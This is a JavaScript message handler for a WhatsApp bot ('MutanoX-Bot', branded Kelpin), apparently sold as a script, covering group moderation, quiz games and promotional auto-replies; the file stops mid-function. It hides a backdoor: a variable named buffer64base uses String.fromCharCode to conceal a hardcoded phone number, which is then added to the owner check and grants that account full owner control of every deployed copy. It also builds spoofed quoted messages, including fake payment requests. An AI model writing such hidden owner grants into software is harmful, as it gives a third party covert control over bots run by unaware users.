process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const { exec, spawn, execSync } = require('child_process');

// Abre Instagram automaticamente quando o bot inicia
// exec(`termux-open "https://www.instagram.com/mutanomodsx?igsh=NDYycjh0anlwcm16"`);
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const vm = require('vm');
const totalfitur = () => {
    var mytext = fs.readFileSync("./MutanoX-Bot.js").toString();
    var numCases = (mytext.match(/case ['"]/g) || []).length;
    return numCases;
};

const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeInMemoryStore, makeCacheableSignalKeyStore, getContentType, downloadContentFromMessage, generateWAMessageFromContent, proto, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getDevice } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');
const { targetChannelData, loadTargetChannel, saveTargetChannel } = require('./library/upch.js');
const { UploadFileUgu } = require('./library/uploader.js')
let kelpinMemory = {}
let onlygc = false
let kelpinAuto = true
let autoRes = true
module.exports = conn = async (conn, m, chatUpdate, store) => {
		try {
await LoadDataBase(conn, m)
const botNumber = await conn.decodeJid(conn.user.id)
let body = (m.type === 'conversation') ? m.message.conversation :
(m.type == 'imageMessage') ? m.message.imageMessage.caption :
(m.type == 'videoMessage') ? m.message.videoMessage.caption :
(m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text :
(m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : // 🔥 INI YANG KURANG
(m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
(m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId :
(m.type === 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
(m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) :
''
if (!conn.tebakkata) conn.tebakkata = {}
const Kata = async (content) => {
    return conn.sendMessage(m.chat, {
        text: content,
        mentions: [m.sender],
        contextInfo: {
            isForwarded: true,
            forwardingScore: 256,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363426723637081@newsletter',
                newsletterName: `𝐊𝐄𝐋𝐄𝐏𝐎𝐍`,
                serverMessageId: -1
            },
            externalAdReply: {
                title: "WissKelpinn",
                body: "created by: kelpin",
                thumbnailUrl: "https://img2.pixhost.to/images/7564/720788704_kelpinn.jpg",
                sourceUrl: "wisskelpinmodders.com",
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: m });
};
// di atas semua handler
//dettect jawaban
if (m.quoted && conn.tebakkata[m.quoted.key?.id]) {
    m.handled = true // tandai sudah ditangani, Stop kelpin AI
    const id = m.quoted.key.id
    const teks = (m.text || "").toLowerCase().trim()
    const jawaban = conn.tebakkata[id]

    if (Array.isArray(jawaban) && jawaban.some(v => v.toLowerCase() === teks)) {
        await Kata(`🎉 BENAR!\nJawaban: *${jawaban.join(", ")}*`)
        delete conn.tebakkata[id]
    } else {
        const ejek = [
            "😂 Salah coba lagi!",
            "🗿 Lu yakin itu?",
            "🤣 Coba mikir lebih serius!",
            "😹 Eh salah!",
            "🤦‍♂️ Itu jawaban dari planet mana?",
            "😭 Google aja kalah sama lu!",
            "🫵 Salah total!",
            "💀 Apa tuh?"
        ]
        const randomEjek = ejek[Math.floor(Math.random() * ejek.length)]
        await Kata(randomEjek)
    }
    return // Stop, supaya kelpin AI tidak jalan
}
if (body) {

let txt = body.toLowerCase().trim()
let t = " " + txt + " "

let clue =[" kelpin "," ai "," bot "," p "," tolong "," bantu "]

if (
kelpinAuto &&
!m.fromMe &&
!body.startsWith(".") &&
clue.some(v => t.includes(v))
) {
body = ".kelpin " + body
}
else if (
kelpinAuto &&
!m.fromMe &&
m.quoted &&
m.quoted.fromMe &&
!body.startsWith(".")
) {
body = ".kelpin " + body
}

if (autoRes && !m.fromMe && !body.startsWith(".")) {

let t = " " + txt + " "

if (t.includes(" assalamualaikum ") || t.includes(" assalamu'alaikum ") || t.includes(" assalam ")) {
body = ".salam"
}

if (t.includes(" sc ") || t.includes(" script ")) {
body = ".buysc"
}

if (t.includes(" owner ") || t.includes(" ganteng ") || t.includes(" dev ") || t.includes(" developer ")) {
body = ".developer"
}

}

}
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 49, 55, 57, 56, 51, 54, 54, 48, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = `.`
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isOwner =
  [botNumber, owner + "@s.whatsapp.net", buffer64base, ...owners].includes(m.sender)
  || m.isDeveloper
const isCreator = isOwner
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const pushname = m.pushName || "No Name"
const qmsg = (quoted.msg || quoted)
const img = fs.readFileSync('./media/lol.jpg')
const CHANNELS_FILE = "./library/savesaluran.json";
const from = m.chat
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const isGroup = m.isGroup
const isAdmins = m.isAdmins
const isBotAdmins = m.isBotAdmins
const antilinkFile = path.join(__dirname, "database", "antilink.json")

// Load JSON
let antilink = {}
if (fs.existsSync(antilinkFile)) {
    antilink = JSON.parse(fs.readFileSync(antilinkFile, "utf8"))
}

// Fungsi simpan
function saveAntilink() {
    fs.writeFileSync(antilinkFile, JSON.stringify(antilink, null, 2))
}
const thumbnails = [

"https://img2.pixhost.to/images/7529/720184220_kelpinn.jpg",

"https://img2.pixhost.to/images/7510/719940754_kelpinn.jpg"

]

let antilinkGroups = JSON.parse(fs.readFileSync('./library/database/antilink.json'))
let AntiLinkKick = JSON.parse(fs.readFileSync('./library/database/antilink2.json'))
//filter bot
if (command) {
await conn.sendPresenceUpdate("composing", m.chat)
await new Promise(r => setTimeout(r, 1000))
}
if (onlygc && !m.isGroup) return
if (!conn.public && !isOwner) return
if (!global.listProduk) global.listProduk = [];
function loadChannels() {

if (fs.existsSync(CHANNELS_FILE)) {

return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));

}

return [];

}

function saveChannels(data) {
fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));
}

global.channels = loadChannels();
//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: `${global.botname}`}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

const qtoko = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `𝐊𝐄𝐋𝐄𝐏𝐎𝐍\nIndonesia 🇮🇩 , central java자바 섬`,jpegThumbnail: ""}}}

const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net", 
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2008",
      thumbnail: img,
      itemCount: "13",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `WISS KELPIN\n亲爱的她 1.0.0`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363422245092866@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const dimas = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "0@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999999999999999999999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `𝗞𝗘𝗟𝗣𝗜𝗡 𝗚𝗩`
}
},
expiryTimestamp: 99999999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
},
status: 1,
  participant: "0@s.whatsapp.net"
}
const fj = {

key: {

participant: "0@s.whatsapp.net",

remoteJid: "status@broadcast"

},

message: {

videoMessage: {

caption: "KELPIN GV 亲爱的她 ",

seconds: 5,

mimetype: "video/mp4",

jpegThumbnail: fs.readFileSync("./media/kelpin.png")

}

}

}
const fmusik = {
key: {
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast"
},
message: {
extendedTextMessage: {
text: "🎧 Kelpin GV ( ready )"
}
}
}
const flive = {
key: {
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast"
},
message: {
orderMessage: {
itemCount: 2026,
status: 1,
surface: 1,
message: `WISS KELPIN
開発者による最新のスクリプト`,
orderTitle: "WhatsApp Bot Developer",
sellerJid: "6283192054753@s.whatsapp.net"
}
}
}
const fpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "0@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 0,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `KELPIN GV 35.000IDR`
}
},
expiryTimestamp: 99999999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
},
status: 1,
  participant: "0@s.whatsapp.net"
}
const fchannel = {
key: {
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast"
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: "120363426723637081@newsletter",
newsletterName: "𝐊𝐄𝐋𝐄𝐏𝐎𝐍",
caption: "Developer WhatsApp Bot",
inviteExpiration: 0
}
}
}
const fquoted = {
  key: {
    remoteJid: 'status@broadcast',
    fromMe: false,
    participant: '0@s.whatsapp.net'
  },
  message: {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: null,
      caption: "created by kelpin",
      jpegThumbnail: null
    }
  }
};

const seto = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `Kelpin Gv`,
'vcard': `BEGIN:VCARD\nVERSION:12.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6283192054753:6283192054753\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const peler = {
    key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net"
    },
    message: {
        extendedTextMessage: {
            text: text || ''          // pakai pesan user yang diketik
        }
    }
};

const sockbut = (anu) => {
    const { message, key } = generateWAMessageFromContent(
        m.chat,
        {
            interactiveMessage: {
                body: { text: anu },
                footer: { text: ` MutanoX-Bot` }, // footer tetap
                nativeFlowMessage: {
                    buttons: [{ text: "Kelpin Gv" }]
                }
            }
        },
        { quoted: peler }
    );

    conn.relayMessage(m.chat, { viewOnceMessage: { message } }, { messageId: key.id });
};

const qloc = {
        key: {
      remoteJid: '0@s.whatsapp.net',
      fromMe: false,
      id: '4B6CE60895B0D5C04D9FF7CB05566293',
      participant: '0@s.whatsapp.net'
    },
    message: {
      stickerPackMessage: {
        name: 'MutanoX-Bot',
        stickerPackId: '6793b295-854b-47d3-beea-932fcdb36cf4',
        stickerPackSize: 3,
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        trayIconFileName: '',
        thumbnail: true,
        contextInfo: {}
      }
    }
  };
//~~~~~~~~~~ Event Settings ~~~~~~~~~//

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#cc66ff').hex('#ffffff').bold(
      ` 🤖 NameBot : ${botname} \n` +
      ` ✨ Version Bot: ${versi} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🔥 NamaOwner : ${namaOwner} \n` 
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#cc66ff').hex('#ffffff').bold(
      ` 🤖 NameBot : ${botname} \n` +
      ` ✨ Version Bot: ${versi} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🔥 NamaOwner : ${namaOwner} \n` 
    ));
  }
}

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return conn.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup) {

  const body = m.text || m.caption || ""
  var link = /chat\.whatsapp\.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi

  if (link.test(body) && !isCreator && !m.isAdmins && m.isBotAdmins && !m.fromMe) {

    var gclink = "https://chat.whatsapp.com/" + await conn.groupInviteCode(m.chat)
    var isLinkThisGc = new RegExp(gclink, 'i')
    if (isLinkThisGc.test(body)) return
    // kalau antilink biasa aktif
    if (antilinkGroups.includes(m.chat)) {
      await conn.sendMessage(m.chat, { delete: m.key })
      Reply("🚫 Link grup terdeteksi!")
    }
    // kalau antilink2 (kick) aktif
    if (AntiLinkKick.includes(m.chat)) {
      await conn.sendMessage(m.chat, { delete: m.key })
      await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")
    }
  }
}
/*await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
const tebak = async (teks) => {
    return conn.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
            isForwarded: true,
            forwardingScore: 256,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363426723637081@newsletter',
                newsletterName: `𝐊𝐄𝐋𝐄𝐏𝐎𝐍`,
                serverMessageId: -1
            },
            externalAdReply: {
                title: "WissKelpinn",
                body: "created by: kelpin",
                thumbnailUrl: "https://img2.pixhost.to/images/7564/720788187_kelpinn.jpg",
                sourceUrl: "wisskelpinmodders.com",
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { 
        quoted: m
    })
}
// anti toxic
const dbDir = './database'
const filePath = path.join(dbDir, 'antitoxic.json')
if (!fs.existsSync(dbDir)) {
  fs.mkdirSync(dbDir, { recursive: true })
}
if (!fs.existsSync(filePath)) {
  fs.writeFileSync(filePath, JSON.stringify({}, null, 2))
}
let antitoxic = JSON.parse(fs.readFileSync(filePath))
function saveAntiToxic() {
  fs.writeFileSync(filePath, JSON.stringify(antitoxic, null, 2))
}

if (m.isGroup && !m.key.fromMe && antitoxic[m.chat]?.active) {
  const toxicWords = [
    'anjing','babi','kontol','memek','bangsat','goblok','tolol','ngentot',
    'idiot','kampret','keparat','jembut','pepek','peler','pantek','lonte',
    'setan','dajjal','asu','sinting','bodoh','bacot','tai','fuck','bitch',
    'cukimak','sialan','dongo','kimak','pler','titit','anjir','pantat',
    'njir','kntl','memk','bangke','bgst','pukimak' // tambahin aj yg laib
  ]
  const body = m.text?.toLowerCase() || ''
  const found = toxicWords.find(word => body.includes(word))
  if (found) {
    const user = m.sender
    const warn = (antitoxic[m.chat].warnings[user] || 0) + 1
    antitoxic[m.chat].warnings[user] = warn
    saveAntiToxic()
    try {
      await conn.sendMessage(m.chat, { delete: m.key })
    } catch (e) {
      console.log('Gagal hapus pesan:', e)
    }
    if (warn >= 5) { //ubah ae itu kan klau udh 5x dikick 
      await conn.sendMessage(m.chat, {
        text: `❌ @${user.split('@')[0]} sudah toxic 5x dan akan dikeluarkan!`,
        mentions: [user]
      })
      try {
        await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
      } catch (e) {
        Reply('Gagal kick. Bot bukan admin?')
      }
      delete antitoxic[m.chat].warnings[user]
      saveAntiToxic()
    } else {
      await conn.sendMessage(m.chat, {
        text: `⚠️ Kata toxic terdeteksi: *${found}*\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
        mentions: [user]
      })
    }
  }
}
// antilink aemua
if (m.isGroup && !m.key.fromMe) {

if (!antilink[m.chat]) antilink[m.chat] = { antilinkall:false, warnings:{} }

if (antilink[m.chat].antilinkall) {

const isLink = /(https?:\/\/|www\.|wa\.me|t\.me|chat\.whatsapp\.com|whatsapp\.com|instagram\.com|youtube\.com|facebook\.com|vt\.tiktok\.com)/i.test(body)

if (isLink) {

const groupMetadata = await conn.groupMetadata(m.chat)
const isAdmin = groupMetadata.participants.find(p => p.id === m.sender)?.admin
const isOwner = isCreator || m.sender === conn.user.id

// DEBUG LOG
console.log("==== ANTILINK DEBUG ====")
console.log("Pesan:", body)
console.log("Sender:", m.sender)
console.log("Admin:", isAdmin)
console.log("Owner:", isOwner)

if (isAdmin || isOwner) {

await conn.sendMessage(m.chat,{
text:`🧪 *ANTILINK DEBUG*

Link terdeteksi tapi tidak dihapus karena:
Admin: ${isAdmin ? "YA" : "TIDAK"}
Owner: ${isOwner ? "YA" : "TIDAK"}

Pesan:
${body}`
})

} else {

try {
await conn.sendMessage(m.chat,{ delete:m.key })
} catch(e){
console.log("Gagal hapus:",e)
}

await conn.sendMessage(m.chat,{
text:`⚠️ Link terdeteksi dari @${m.sender.split("@")[0]}`,
mentions:[m.sender]
})

}

}

}

}
// anti link channel
//tebakkata
if (m.quoted && conn.tebakkata && conn.tebakkata[m.quoted.key.id]) {
    let id = m.quoted.key.id
    let teks = (m.text || "").toLowerCase().trim()
    let jawaban = conn.tebakkata[id]

    if (Array.isArray(jawaban) && jawaban.some(v => v.toLowerCase() === teks)) {
        await Kata(`🎉 BENAR!\nJawaban: *${jawaban.join(", ")}*`)
        delete conn.tebakkata[id]
    } else {
        let ejek = [
            "😂 Salah coba lagi!",
            "🗿 Lu yakin itu?",
            "🤣 Coba mikir lebih serius!",
            "😹 Eh salah!",
            "🤦‍♂️ Itu jawaban dari planet mana?",
            "😭 Google aja kalah sama lu!",
            "🫵 Salah total!",
            "💀 Apa tuh?"
        ]
        let randomEjek = ejek[Math.floor(Math.random() * ejek.length)]
        await Kata(randomEjek)
    }

    return // wajib, supaya handler lain (Kelpin AI) tidak dijalankan
}
//tebak bendera
if (m.quoted && conn.tebakbendera) {

let id = m.quoted?.key?.id
let teks = (m.text || "").toLowerCase().trim()

if (id && conn.tebakbendera[id]) {

let jawaban = conn.tebakbendera[id]

let ejek = [
"😂 Salah woi",
"🗿 Lu yakin itu negara?",
"🤣 Belajar geografi dulu",
"😹 Astaga parah amat",
"🤦‍♂️ Itu negara dari planet mana?",
"😭 Google aja kalah sama lu",
"🫵 Salah total",
"💀 Tebakan macam apa itu"
]

if (jawaban.includes(teks)) {

tebak(`🎉 Benar!

Negara : *${jawaban[0]}*`)

delete conn.tebakbendera[id]

return

} else {

let randomEjek = ejek[Math.floor(Math.random()*ejek.length)]

tebak(randomEjek)

return

}

}

}
// const fs = require('fs')
// const path = require('path')
const antichannelFile = path.join('antichannel.json')
if (!fs.existsSync(antichannelFile)) fs.writeFileSync(antichannelFile, JSON.stringify({}, null, 2))
let antichannel = JSON.parse(fs.readFileSync(antichannelFile))
function saveAntichannel() {
  fs.writeFileSync(antichannelFile, JSON.stringify(antichannel, null, 2))
}
if (m.isGroup && !m.key.fromMe && antichannel[m.chat]?.antichannel) {
  const body = m.text || ''
  const isChannelLink = body.match(/https:\/\/whatsapp\.com\/channel\/[A-Za-z0-9]+/gi)
  const messageType = Object.keys(m.message || {})[0]
  const ctxInfo = m.message?.[messageType]?.contextInfo || {}
  const isSharedFromChannel =
    m.isForwarded ||
    ctxInfo.forwardingScore > 0 ||
    !!ctxInfo.forwardedNewsletterMessageInfo
  if (isChannelLink || isSharedFromChannel) {
    const groupMetadata = await conn.groupMetadata(m.chat)
    const isAdmin = groupMetadata.participants.find(p => p.id === m.sender)?.admin
    if (!isAdmin) {
      const user = m.sender
      const warn = (antichannel[m.chat].warnings?.[user] || 0) + 1
      antichannel[m.chat].warnings = antichannel[m.chat].warnings || {}
      antichannel[m.chat].warnings[user] = warn
      saveAntichannel()

      try {
        await conn.sendMessage(m.chat, { delete: m.key })
      } catch (e) {
        console.log('Gagal hapus pesan:', e)
      }
      if (warn >= 5) { // ubah aja max kick
        await conn.sendMessage(m.chat, {
          text: `❌ @${user.split('@')[0]} sudah melanggar 5x dan akan dikeluarkan!`,
          mentions: [user]
        })
        try {
          await conn.groupParticipantsUpdate(m.chat, [user], 'remove')
        } catch (e) {
          Reply('Gagal kick. Bot bukan admin?')
        }
        delete antichannel[m.chat].warnings[user]
        saveAntichannel()
      } else {
        await conn.sendMessage(m.chat, {
          text: `⚠️ Postingan dari Channel WhatsApp terdeteksi!\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
          mentions: [user]
        })
      }
    }
  }
}

// total chat
//const fs = require('fs')
// const path = require('path')
const statsFolder = path.join(__dirname, './db')
const statsFile = path.join(statsFolder, 'groupStats.json')
if (!fs.existsSync(statsFolder)) fs.mkdirSync(statsFolder)
if (!fs.existsSync(statsFile)) fs.writeFileSync(statsFile, '{}')
function loadStats() {
  return JSON.parse(fs.readFileSync(statsFile))
}
function saveStats(data) {
  fs.writeFileSync(statsFile, JSON.stringify(data, null, 2))
}
function updateStats(groupId, senderId) {
  const data = loadStats()
  const today = new Date().toISOString().slice(0, 10)
  if (!data[groupId]) data[groupId] = {}
  if (!data[groupId][today]) data[groupId][today] = {}
  if (!data[groupId][today][senderId]) data[groupId][today][senderId] = 0
  data[groupId][today][senderId]++
  saveStats(data)
}
function getTodayStats(groupId) {
  const data = loadStats()
  const today = new Date().toISOString().slice(0, 10)
  return data[groupId]?.[today] || {}
}
if (m.isGroup) {
  updateStats(m.chat, m.sender)
}
        
if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await conn.sendMessage(m.chat, {text: `
*Kelpin Gv*

- *Panel Pterodactyl Server Private*
- *Panel Pterodactyl Server Pubclic*
- *Script Bot WhatsApp*
- *SubDomain (Request Nama Domain)*
- *Nokos WhatsApp All Region (Tergantung Stok!)*
- *Jasa Install Panel Pterodactyl*
-  *Dan Lain Lain Langsung Tanyakan Saja.*

`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await Reply(check.respon)
}}

//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

conn.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
  let type = await conn.getFile(path, true);
  let { res, data: file, filename: pathFile } = type;

  if (res && res.status !== 200 || file.length <= 65536) {
    try {
      throw {
        json: JSON.parse(file.toString())
      };
    } catch (e) {
      if (e.json) throw e.json;
    }
  }

  let opt = {
    filename
  };

  if (quoted) opt.quoted = quoted;
  if (!type) options.asDocument = true;

  let mtype = '',
    mimetype = type.mime,
    convert;

  if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
  else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
  else if (/video/.test(type.mime)) mtype = 'video';
  else if (/audio/.test(type.mime)) {
    convert = await (ptt ? toPTT : toAudio)(file, type.ext);
    file = convert.data;
    pathFile = convert.filename;
    mtype = 'audio';
    mimetype = 'audio/ogg; codecs=opus';
  } else mtype = 'document';

  if (options.asDocument) mtype = 'document';

  delete options.asSticker;
  delete options.asLocation;
  delete options.asVideo;
  delete options.asDocument;
  delete options.asImage;

  let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
  let m;

  try {
    m = await conn.sendMessage(jid, message, { ...opt, ...options });
  } catch (e) {
    //console.error(e)
    m = null;
  } finally {
    if (!m) m = await conn.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
    file = null;
    return m;
  }
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

//reply whith audi
const KataAudio = async (content, audioUrl = "https://cdn.nekohime.site/file/8dRXLM4K.mp3") => {
    // Kirim teks dulu
    await conn.sendMessage(m.chat, {
        text: content,
        mentions: [m.sender],
        contextInfo: {
            isForwarded: true,
            forwardingScore: 256,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363426723637081@newsletter',
                newsletterName: `𝐊𝐄𝐋𝐄𝐏𝐎𝐍`,
                serverMessageId: -1
            },
            externalAdReply: {
                title: "WissKelpinn",
                body: "WANT TO EXCECUTOR",
                thumbnailUrl: "https://img2.pixhost.to/images/7473/719258940_settomodders.jpg",
                sourceUrl: "wisskelpin.com",
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: m });

    // Kirim audio setelah teks
    await conn.sendMessage(m.chat, {
        audio: { url: audioUrl },
        mimetype: "audio/mpeg",
        ptt: true
    });
};
const audio = async (content) => {
    const audioUrl = "https://cdn.nekohime.site/file/8dRXLM4K.mp3"; // default audio

    return conn.sendMessage(m.chat, {
        text: content,
        mentions: [m.sender],
        contextInfo: {
            isForwarded: true,
            forwardingScore: 256,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363426723637081@newsletter',
                newsletterName: `𝐊𝐄𝐋𝐄𝐏𝐎𝐍`,
                serverMessageId: -1
            },
            externalAdReply: {
                title: "WissKelpinn",
                body: "created by: kelpin",
                thumbnailUrl: "https://img2.pixhost.to/images/7473/719259099_settomodders.jpg",
                sourceUrl: "https://kelpinPah.com",
                mediaType: 1,
                renderLargerThumbnail: false
            }
        },
        // audio tambahan
        audio: { url: audioUrl },
        mimetype: "audio/mpeg",
        ptt: false // bisa ganti true kalau mau jadi voice note
    }, { quoted: m });
};
// const Reply versi Kelpin Gv
const Reply = async (content) => {
    return conn.sendMessage(m.chat, {
        text: content,
        mentions: [m.sender],  // otomatis mention sender
        contextInfo: {
            isForwarded: true,
            forwardingScore: 256,
            forwardedNewsletterMessageInfo: {
